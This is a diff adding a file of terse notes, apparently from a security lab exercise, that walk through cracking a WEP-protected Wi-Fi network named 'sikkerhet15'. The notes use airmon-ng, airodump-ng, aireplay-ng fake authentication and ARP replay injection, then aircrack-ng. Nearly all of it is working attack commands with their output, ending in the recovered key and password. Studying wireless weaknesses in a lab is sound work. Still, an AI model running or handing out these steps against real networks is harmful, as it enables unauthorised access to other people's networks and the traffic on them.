@@ -1,0 +1,69 @@
+- list of your network interfaces
+sudo airmon-ng
+
+wlp2s0
+
+- enable monitor mode
+sudo airmon-ng start wlp2s0
+
+- list nettworks
+sudo airodump-ng wlp2s0mon
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ B4:DE:31:CB:27:00   -1        0        0    0   6  -1                    <length:  0>
+ 00:1A:70:9C:C1:2E  -37       42        0    0   6  54   WEP  WEP         sikkerhet15
+
+
+- set up a watch
+sudo airodump-ng -c 6 -w WEP_crack_file --bssid 00:1A:70:9C:C1:2E wlp2s0mon
+made a watch...
+
+- Authenticating
+sudo aireplay-ng -1 0 -a 00:1A:70:9C:C1:2E -h 14:4f:8a:5f:f0:1e -e sikkerhet15 wlp2s0mon
+
+13:25:51  Waiting for beacon frame (BSSID: 00:1A:70:9C:C1:2E) on channel 6
+
+13:25:52  Sending Authentication Request (Open System) [ACK]
+13:25:52  Authentication successful
+13:25:52  Sending Association Request [ACK]
+13:25:52  Association successful :-) (AID: 1)
+
+- Route traffic
+sudo aireplay-ng -3 -b 00:1A:70:9C:C1:2E -h 14:4f:8a:5f:f0:1e wlp2s0mon
+
+- After a couple of thousand data packets:
+
+ CH  6 ][ Elapsed: 2 mins ][ 2019-10-17 14:12 ][ fixed channel wlp2s0mon: 2
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ 00:1A:70:9C:C1:2E  -31 100      258    33390  945   6  54   WEP  WEP    OPN  sikkerhet15
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+
+ 00:1A:70:9C:C1:2E  A4:02:B9:45:AF:8D  -38    6 -54     94    62130
+
+
+- Crack!
+sudo aircrack-ng -b 00:1A:70:9C:C1:2E WEP_crack_file-01.cap
+
+
+
+                                        Aircrack-ng 1.2 rc4
+
+
+                        [00:00:00] Tested 194 keys (got 26672 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  4   AA(34304) 32(33536) 88(33024) BE(32256) 05(31744) 75(31488)
+    1    0/  4   AA(35072) 66(34560) 77(33280) 34(33024) 94(32256) 84(31232)
+    2    1/  5   31(34304) 09(33024) DB(33024) F5(33024) 79(32512) C9(32512)
+    3    0/  1   23(37888) 8A(35072) CE(34304) C1(33792) 59(32512) 44(32256)
+    4    0/  3   45(36096) 31(34304) 9B(34304) 11(33280) FC(33024) 98(32768)
+
+                         KEY FOUND! [ AA:AA:A1:23:45 ]
+        Decrypted correctly: 100%
+
+
+PW: AAAAA12345
